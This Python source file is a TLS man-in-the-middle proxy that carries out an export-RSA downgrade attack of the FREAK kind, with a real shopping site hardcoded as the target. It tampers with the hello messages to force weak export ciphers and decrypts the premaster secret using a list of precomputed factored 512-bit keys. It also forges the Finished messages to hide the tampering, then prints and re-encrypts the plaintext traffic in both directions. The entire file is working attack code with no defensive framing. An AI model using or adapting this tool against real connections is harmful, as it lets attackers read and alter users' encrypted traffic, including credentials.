#!/usr/bin/env python
# encoding: utf-8

import socket
import SocketServer
import select
import struct
from handleConversation import Handle
PORT = 8888
SO_ORIGINAL_DST = 80

CHANGE_CIPHER_SPEC = 20
ALERT = 21
HANDSHAKE = 22
APPLICATION_DATA = 23

HELLO_REQUEST = 0
CLIENT_HELLO = 1
SERVER_HELLO = 2
CERTIFICATE = 11
SERVER_KEY_EXCHANGE = 12
CERTIFICATE_REQUEST = 13
SERVER_HELLO_DONE = 14
CERTIFICATE_VERIFY = 15
CLIENT_KEY_EXCHANGE = 16
FINISHED = 20
CERTIFICATE_STATUS = 22

ip = 'suning.com'
port = 443


Ns = {}

class ServerHandler(SocketServer.BaseRequestHandler):

    #clientcipher = ['\x00', '\x35']
    clientcipher = ['\x00', '\x04']
    Nlist = []


    def calpre(self, encpre):
        n = self.postprocess(self.modulus).encode('hex')
        print 'Ns: ', Ns
        if n in Ns.keys():
            d = Ns[n]
            print "N hit!"
        else:
            print 'N: %s'%(self.postprocess(self.modulus).encode('hex'))
            if self.postprocess(self.modulus).encode('hex') not in self.Nlist:
                self.Nlist.append(self.postprocess(self.modulus).encode('hex'))
            print self.Nlist
            raise ValueError('Invalid N')
        c = int(self.postprocess(encpre).encode('hex'), 16)
        d = int(d, 16)
        n = int(n, 16)
        m = pow(c, d, n)
        dec = hex(m)[2:].strip('L').rjust(128, '0').decode('hex')
        assert(dec[0:2] == '\x00\x02')
        self.pre = list(dec[dec.find('\x00', 2)+1 :])

    def postprocess(self, l):
        return ''.join(l)


    def get_original_addr(self, csock):
		odestdata = csock.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
		_, port, a1, a2, a3, a4 = struct.unpack("!HHBBBBxxxxxxxx", odestdata)
		address = "%d.%d.%d.%d" % (a1, a2, a3, a4)
		return address, port

    def handle(self):
        self.clientrandom = []
        self.serverrandom = []
        self.version = []
        self.modulus = []
        self.pre = ''
        self.c_hsmsg = []
        self.s_hsmsg = []
        self.clientfinished = False
        self.serverfinished = False
        self.servercipher = []

        csock = self.request
        ssock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #ip, port = self.get_original_addr(csock)
        ssock.connect((ip, port))
        print "Connecting (%s, %s)"%(ip, port)

        try:
            while (1):
                datalist = self.recv_one(ssock, csock)
                if len(datalist) == 0:
                    break
                for readable, data in datalist:
                    content_type = ord(data[0])
                    if content_type == HANDSHAKE:
                        hs_type = ord(data[5])

                        if hs_type == HELLO_REQUEST:
                            print "HELLO_REQUEST"
                        elif hs_type == CLIENT_HELLO and not (self.clientfinished or self.serverfinished):
                            print "CLIENT_HELLO"
                            self.c_hsmsg += data[5:]
                            data = self.helloprocess(data)
                            self.s_hsmsg += data[5:]
                        elif hs_type == SERVER_HELLO and not (self.clientfinished or self.serverfinished):
                            print "SERVER_HELLO"
                            self.s_hsmsg += data[5:]
                            data = self.helloprocess(data)
                            self.c_hsmsg += data[5:]
                        elif hs_type == CERTIFICATE and not (self.clientfinished or self.serverfinished):
                            print "CERTIFICATE"
                            self.c_hsmsg += data[5:]
                            self.s_hsmsg += data[5:]
                        elif hs_type == SERVER_KEY_EXCHANGE and not (self.clientfinished or self.serverfinished):
                            self.s_hsmsg += data[5:]
                            print "SERVER_KEY_EXCHANGE"
                            self.serverkeyexgprocess(data)
                            self.c_hsmsg += data[5:]
                        elif hs_type == CERTIFICATE_REQUEST:
                            print "CERTIFICATE_REQUEST"
                        elif hs_type == SERVER_HELLO_DONE and not (self.clientfinished or self.serverfinished):
                            print "SERVER_HELLO_DONE"
                            self.c_hsmsg += data[5:]
                            self.s_hsmsg += data[5:]
                        elif hs_type == CERTIFICATE_VERIFY:
                            print "CERTIFICATE_VERIFY"
                        elif hs_type == CLIENT_KEY_EXCHANGE and not (self.clientfinished or self.serverfinished):
                            print "CLIENT_KEY_EXCHANGE"
                            self.c_hsmsg += data[5:]
                            self.clientkeyexgprocess(data)
                            self.s_hsmsg += data[5:]
                        elif hs_type == CERTIFICATE_STATUS:
                            print "CERTIFICATE_STATUS"
                        else:
                            if readable == csock and self.clientfinished:
                                print "CLIENT_ENCRYPTED_HS_MSG"
                                if not self.client_verify_finished(data):
                                    print 'Client Finished Verify Error!'
                                forged_finish = self.client_forge_finished()
                                data = data[:3] + list(struct.pack('>H', len(forged_finish))) + forged_finish
                                #print 'forged client finished:', self.postprocess(data).encode('hex')
                            elif readable == ssock and self.serverfinished:
                                print "SERVER_ENCRYPTED_HS_MSG"
                                if not self.server_verify_finished(data):
                                    print "Server Finshed Verify Error!!"
                                forged_finish = self.server_forge_finished()
                                data = data[:3] + list(struct.pack('>H', len(forged_finish))) + forged_finish
                                #print 'forged server finished:', self.postprocess(data).encode('hex')
                            else:
                                print "error!!!!not handshake message!!"
                                #print self.postprocess(data).encode('hex')

                    elif content_type == CHANGE_CIPHER_SPEC:
                        assert(self.postprocess(data[4:6]) == '\x01\x01')
                        if readable == csock:
                            print "CLIENT_CHANGE_CIPHER_SPEC"
                            self.handleclient = Handle(self.postprocess(self.version), self.postprocess(self.clientrandom), self.postprocess(self.serverrandom), self.postprocess(self.pre), self.postprocess(self.clientcipher))
                            self.handleserver = Handle(self.postprocess(self.version), self.postprocess(self.clientrandom), self.postprocess(self.serverrandom), self.postprocess(self.pre), self.postprocess(self.servercipher))
                            self.clientfinished = True
                        else:
                            print "SERVER_CHANGE_CIPHER_SPEC"
                            self.serverfinished = True
                    elif content_type == ALERT:
                        print "ALERT"
                    elif content_type == APPLICATION_DATA:
                        print '-'*80
                        print '-'*29 + 'APPLICATION_DATA BEGIN' + '-'*29
                        print '-'*80
                        if readable == csock:
                            label = 'client'
                            dec = self.handleclient.decrypt(self.postprocess(data[5:]), label)
                            dec = self.handleclient.check_strip_mac(dec, label)
                            
                            print 'CLIENT:', dec
                            pdata = self.postprocess(data[0:3]) + struct.pack('>H', len(dec)) + dec
                            mac = self.handleserver.calmac(pdata, label)
                            enc = self.handleserver.encrypt(dec+mac, label)
                            data = list(self.postprocess(data[0:3]) + struct.pack('>H', len(enc)) + enc)
                        else:
                            label = 'server'
                            dec = self.handleserver.decrypt(self.postprocess(data[5:]), label)
                            dec = self.handleserver.check_strip_mac(dec, label)
                            print 'SERVER', dec
                            pdata = self.postprocess(data[0:3]) + struct.pack('>H', len(dec)) + dec
                            mac = self.handleclient.calmac(pdata, label)
                            enc = self.handleclient.encrypt(dec+mac, label)
                            data = list(self.postprocess(data[0:3]) + struct.pack('>H', len(enc)) + enc)
                        print '-'*80
                        print '-'*29 + 'APPLICATION_DATA END' + '-'*29
                        print '-'*80

                    if readable == csock:
                        ssock.sendall(self.postprocess(data))
                    else:
                        csock.sendall(self.postprocess(data))
        except socket.error:
            pass
        finally:
            ssock.close()

    def recv_one(self, ssock, csock):
        readable = select.select([ssock, csock], [], [], 30)[0]
        datalist = []
        if len(readable) == 0:
            print "none is readable!!!"
        for r in readable:
            record_header = self.recvall(r, 5)
            if len(record_header) < 5:
                continue
            length = struct.unpack(">H", record_header[3:5])[0]
            data = self.recvall(r, length)
            assert(len(data) == length)
            datalist.append((r, list(record_header + data)))
        return datalist

    def recvall(self, client, length):
        rlen = length
        data = ''
        while rlen > 0:
            tmp = client.recv(rlen)
            if not tmp:
                break
            data += tmp
            rlen -= len(tmp)
        return data

    def read_line(self, client):
        line = ''
        while True:
            s = client.recv(1)
            if not s:
                break
            if s == '\n':
                break
            line += s
        return line
    
    def helloprocess(self, data):
        assert(type(data) == list)
        sessionid_len = ord(data[43])
        if ord(data[5]) == CLIENT_HELLO:
            self.clientrandom = data[11:43]
            cs_len = struct.unpack(">H", "".join(data[44 + sessionid_len: 44 + sessionid_len + 2]))[0]
            l = [0x03, 0x26, 0x00, 0x01, 0x02, 0x06, 0x08, 0x0b, 0x0e, 0x11, 0x14, 0x17, 0x19,  0x27, 0x28, 0x29, 0x2a, 0x2b, 0x18, 0x1a, 0x1b, 0x34, 0x3a, 0x46, 0x6c, 0x6d, 0x89, 0x9b, 0xa6, 0xa7, 0xbf, 0xc5, 0x2c, 0x2d, 0x2e, 0x3b, 0xb0, 0xb1, 0xb4, 0xb5, 0xb8, 0xb9]
            
            for i in range(min(cs_len/2, len(l))):
                data[44 + sessionid_len + 2 + 2 * i] = '\x00'
                data[44 + sessionid_len + 2 + 1 + 2 * i] = chr(l[i])
            newhello = data[9:43] + ['\x00'] + data[44 + sessionid_len:]
            newhello = data[5:6] + list(struct.pack('>I', len(newhello))[1:]) + newhello
            newhello = data[:3] + list(struct.pack('>H', len(newhello))) + newhello
            return newhello
        elif ord(data[5]) == SERVER_HELLO:
            self.version = data[9:11]
            self.serverrandom = data[11:43]
            self.servercipher = data[44 + sessionid_len:46 + sessionid_len]
            print 'Server TLS Version: %s' % self.postprocess(self.version).encode('hex')
            print 'Server CipherSuite: %s' % self.postprocess(self.servercipher).encode('hex')
            print 'Client CipherSuite: %s' % self.postprocess(self.clientcipher).encode('hex')
            data[44 + sessionid_len:46 + sessionid_len] = self.clientcipher
            newhello = data[9:43] + ['\x00'] + data[44 + sessionid_len:]
            newhello = data[5:6] + list(struct.pack('>I', len(newhello))[1:]) + newhello
            newhello = data[:3] + list(struct.pack('>H', len(newhello))) + newhello
            return newhello
        else:
            print "error!!!Not hellomessage!!"
            print self.postprocess(data).encode('hex')

    def serverkeyexgprocess(self, data):
        assert(type(data) == list)
        self.modulus = data[11:11+64]

    def clientkeyexgprocess(self, data):
        assert(type(data) == list)
        self.calpre(data[11:11+64])

    def client_verify_finished(self, data):
        assert(type(data) == list)
        length = int(self.postprocess(data[3:5]).encode('hex'), 16)
        encfinish = data[5:5+length]
        #print 'encrypted client hsmsg:', self.postprocess(encfinish).encode('hex')
        decfinish = self.handleclient.decrypt(self.postprocess(encfinish), 'client')
        #print 'decrypted client hsmsg:', decfinish.encode('hex')
        decmac = decfinish[16:]
        decfinish = decfinish[:16]
        mac = self.handleclient.calmac(self.postprocess(data[0:3]) + struct.pack('>H', len(decfinish)) + decfinish, 'client')
        if mac != decmac:
            raise ValueError('Finish Mac Error')
        caledfinish = self.handleclient.calFinish(self.postprocess(self.c_hsmsg), 'client finished')
        self.c_hsmsg += caledfinish
        caledfinish = self.postprocess(caledfinish)
        #print 'calclated client hsmsg:', caledfinish.encode('hex')
        return decfinish == caledfinish

    def server_verify_finished(self, data):
        assert(type(data) == list)
        length = int(self.postprocess(data[3:5]).encode('hex'), 16)
        encfinish = data[5:5+length]
        #print 'encrypted server hsmsg:', self.postprocess(encfinish).encode('hex')
        decfinish = self.handleserver.decrypt(self.postprocess(encfinish), 'server')
        #print 'decrypted server hsmsg:', decfinish.encode('hex')
        decmac = decfinish[16:]
        decfinish = decfinish[:16]
        mac = self.handleserver.calmac(self.postprocess(data[0:3]) + struct.pack('>H', len(decfinish)) + decfinish, 'server')
        if mac != decmac:
            raise ValueError('Finish Mac Error')
        caledfinish = self.handleserver.calFinish(self.postprocess(self.s_hsmsg), 'server finished')
        self.s_hsmsg += caledfinish
        caledfinish = self.postprocess(caledfinish)
        #print 'calclated server hsmsg:', caledfinish.encode('hex')
        return decfinish == caledfinish

    def client_forge_finished(self):
        forged_finish = self.handleserver.calFinish(self.postprocess(self.s_hsmsg), 'client finished')
        self.s_hsmsg += forged_finish
        forged_finish = ''.join(forged_finish)
        forged_mac = self.handleserver.calmac('\x16' + self.postprocess(self.version) + struct.pack('>H', len(forged_finish)) + forged_finish, 'client')
        return list(self.handleserver.encrypt(forged_finish + forged_mac, 'client'))

    def server_forge_finished(self):
        forged_finish = self.handleclient.calFinish(self.postprocess(self.c_hsmsg), 'server finished')
        self.c_hsmsg += forged_finish
        forged_finish = ''.join(forged_finish)
        forged_mac = self.handleclient.calmac('\x16' + self.postprocess(self.version) + struct.pack('>H', len(forged_finish)) + forged_finish, 'server')
        return list(self.handleclient.encrypt(forged_finish + forged_mac, 'server'))

class ThreadedServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    pass


def getPossibleN():
    f = open('keys.list', 'r')
    for i in f.readlines():
        if i.find('#') == -1:
            l = i.strip().split(', ')
            Ns[l[0]] = l[1]
    print 'Ns caled!!!'

if __name__ == "__main__":
    ThreadedServer.allow_reuse_address = True
    getPossibleN()
    ThreadedServer(('', PORT), ServerHandler).serve_forever()
